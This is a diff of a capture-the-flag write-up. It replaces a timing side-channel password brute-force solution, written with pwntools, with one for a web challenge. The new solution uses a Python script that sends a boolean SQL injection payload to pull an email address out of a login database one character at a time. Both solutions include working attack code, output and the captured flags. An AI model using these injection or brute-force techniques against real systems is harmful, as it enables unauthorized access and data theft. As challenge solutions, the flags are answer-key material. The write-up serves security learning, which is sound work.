@@ -1,91 +1,95 @@
-# MogamBro's Certainty Principle (PWN)
+# Too Blind To See
 
 `Description`
 
-MogamBro's Certainty Principle states that the more accurate you are the more delay you'll face. Δt • Δp ≥ frustration / ram_space; where p is precission and t is time.
+Mogambro, our rookie intern, just stepped foot into the prestigious Software Firm. His big moment, the first project review, is knocking at the door like a pesky neighbor. But wait! Somewhere in his app lurks a secret which the admins are not aware of, hidden behind the password 'fluffybutterfly'. Can you crack the code and rescue Mogambro from this password puzzle? The clock is ticking!
 
-```
-$ nc 20.244.33.146 4445
-Enter password: A
-Incorrect password
-Time taken:  8.574516805406616e-05
-```
+http://20.244.82.82:7000/
+
+![alt text](images/image.png)
+
+![alt text](images/image-4.png)
 
 `Solution`
 
-Base from the description of the challenge, every input password will give us the time taken. So I tried a lot of inputs like single characters.
+I started with scanning and enumeration of the website using `Burpsuite`. 
 
-```
-$ nc 20.244.33.146 4445
-Enter password: s
-Incorrect password
-Time taken:  0.10007056659247279
+![alt text](images/image-1.png)
 
-$ nc 20.244.33.146 4445
-Enter password: s
-Incorrect password
-Time taken:  0.10003479356750938
-```
+And found the high severity vulnerability after scanning then send to repeater.
 
-I noticed that if I input 's' the time taken is constant < 1 so this guessing game. So I wrote a script to brute force the password.
+![alt text](images/image-3.png)
+
+This is an output based SQL injection. Then tried to bruteforce to grab and email from the database using `LIKE`.
+
+![alt text](images/image-2.png)
+
+I wrote a script to bruteforce the email from the database.
 
 ```python
-from pwn import *
+import requests
+import concurrent.futures
 
-charset = 'abcdefghijklmnopqrstuvwxyz'
+chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@."
 
-stored_nums = '7' # decimal part of the time taken
-stored_nums2 = '7' # decimal part of the time taken
+url = 'http://20.244.82.82:7000/final-destination' # POST
 
-password1 = 'sloppytoppywithatwist'
-password2 = 'gingerdangerhermoinegranger'
-password3 = 'hickerydickerydockskibididobdobpop'
-password4 = 'snickersnortsupersecureshortshakingsafarisadistic'
-password5 = 'boompopwhizzleskizzleraptrapmeowbarkhowlbuzzdrumburpfartpoo'
 
-context.log_level = 'info'
+email=''
 
-# any chars execpt 's' gives Time Taken > 0.1000....
-# so start with 0.1 get only the decimal part of the time taken
+def check_email(email):
+    data = {
+        "email": f"' or email like '{email}%'--"
+    }
+    res = requests.post(url, data=data)
+    return "Email exists" in res.text
 
-while True:
-    for c in charset:
-        io = remote('20.244.33.146', 4445)
-        io.sendlineafter(':', password1) # level 1 passed
-        io.sendlineafter(':', password2) # level 2 passed
-        io.sendlineafter(':', password3) # level 3 passed
-        io.sendlineafter(':', password4)  # level 4 passed
-        io.sendlineafter(':', password5 + c) # level 5
-        io.recvline()
-        res = io.recvline().decode().strip().split(' ')[-1]
-        info(f'c: {c}, res: {res}, password: {password1}, password2: {password2}, password3: {password3}, password4: {password4}, password5: {password5 + c}')
-        
 
-        res2 = res.split('.')[1]
+with concurrent.futures.ThreadPoolExecutor() as executor:
+    while True:
+        futures = [executor.submit(check_email, email + char) for char in chars]
+        concurrent.futures.wait(futures)
 
-        # since the decimal places values is not constant that's why I used the first 2 decimal places
-        if res2[1] != stored_nums[-1] or res2[2] != stored_nums2[-1]:
-            stored_nums += res2[1]
-            stored_nums2 += res2[2]
-            password5 += c
-            print(password5)
-            break
-        io.close()
+        for char, future in zip(chars, futures):
+            if future.result():
+                email += char
+                print("EMAIL: ", email)
+                break
 ```
-My solution is not quite good since every right precision (character) the time taken will getting slower and slower (takes more hours to bruteforce when you reach level 4 - 5). You can enhance this by running multithreading.
-
-After found the password for level 5, we got the flag.
 
 ```
-└─$ nc 20.244.33.146 4445
-Enter password: sloppytoppywithatwist
-Congratulations! You have unlocked the door to level 2!
-Enter password: gingerdangerhermoinegranger
-Congratulations! You have unlocked the door to level 3!
-Enter password: hickerydickerydockskibididobdobpop
-Congratulations! You have unlocked the door to level 4!
-Enter password: snickersnortsupersecureshortshakingsafarisadistic
-Congratulations! You have unlocked the door to level 5!
-Enter password: boompopwhizzleskizzleraptrapmeowbarkhowlbuzzdrumburpfartpoop
-Congratulations! You have unlocked all the doors. THe flag is BITSCTF{c0n6r47ul4710n5_0n_7h3_5ucc355ful_3n7ry}
+└─$ python3 solver.py
+EMAIL:  k
+EMAIL:  kr
+EMAIL:  kra
+EMAIL:  kraz
+EMAIL:  krazy
+EMAIL:  krazyk
+EMAIL:  krazyko
+EMAIL:  krazykor
+EMAIL:  krazykorg
+EMAIL:  krazykorga
+EMAIL:  krazykorgao
+EMAIL:  krazykorgaon
+EMAIL:  krazykorgaonk
+EMAIL:  krazykorgaonka
+EMAIL:  krazykorgaonkar
+EMAIL:  krazykorgaonkar@
+EMAIL:  krazykorgaonkar@h
+EMAIL:  krazykorgaonkar@ho
+EMAIL:  krazykorgaonkar@hot
+EMAIL:  krazykorgaonkar@hotm
+EMAIL:  krazykorgaonkar@hotma
+EMAIL:  krazykorgaonkar@hotmai
+EMAIL:  krazykorgaonkar@hotmail
+EMAIL:  krazykorgaonkar@hotmail.
+EMAIL:  krazykorgaonkar@hotmail.c
+EMAIL:  krazykorgaonkar@hotmail.co
+EMAIL:  krazykorgaonkar@hotmail.com
 ```
+
+I got the email and I logged in with the email and password `fluffybutterfly` and got the flag.
+
+![alt text](images/image-5.png)
+
+`FLAG: BITSCTF{5UB5Cr183r5_4r3_M0r3_7HAN_JU5T_C0N5UM3r5}`
